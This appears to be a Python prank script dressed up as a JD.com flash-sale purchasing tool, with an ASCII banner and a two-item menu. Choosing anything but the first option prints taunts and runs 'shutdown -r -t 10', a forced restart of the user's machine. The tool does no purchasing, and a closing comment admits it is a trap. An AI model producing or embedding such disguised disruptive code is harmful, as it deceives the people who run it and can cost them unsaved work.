#!/usr/bin/env python
# -*- coding:utf-8 -*-
# 该程序在我看来能排到第一，甚至可以和当下最火的枪茅台案例结合一下。
# from:https://mp.weixin.qq.com/s/R9Z0LR9htZcgl7vVvY1sdQ

import os
import time

a = """

     oooo oooooooooo.            .oooooo..o                     oooo         o8o  oooo  oooo
     `888 `888'   `Y8b          d8P'    `Y8                     `888         `"'  `888  `888
     888  888      888         Y88bo.       .ooooo.   .ooooo.   888  oooo  oooo   888   888
     888  888      888          `"Y8888o.  d88' `88b d88' `"Y8  888 .8P'   `888   888   888
     888  888      888 8888888      `"Y88b 888ooo888 888        888888.     888   888   888
     888  888     d88'         oo     .d8P 888    .o 888   .o8  888 `88b.   888   888   888
.o. 88P o888bood8P'           8""88888P'  `Y8bod8P' `Y8bod8P' o888o o888o o888o o888o o888o
`Y888P

功能列表：
1.预约商品
2.秒杀抢购商品
"""
print(a)

key = input("请选择:")

if key == "1":
    time.sleep(1.5)
    print('没有预约到\n')
    time.sleep(3)
    print('没事的，来抱一哈\n')

else:
    print("既然如此...")
    time.sleep(3)
    print("那你想得美~~~~~")
    os.system('shutdown -r -t 10')
time.sleep(10)

# 别运行，运行之后别怪我。
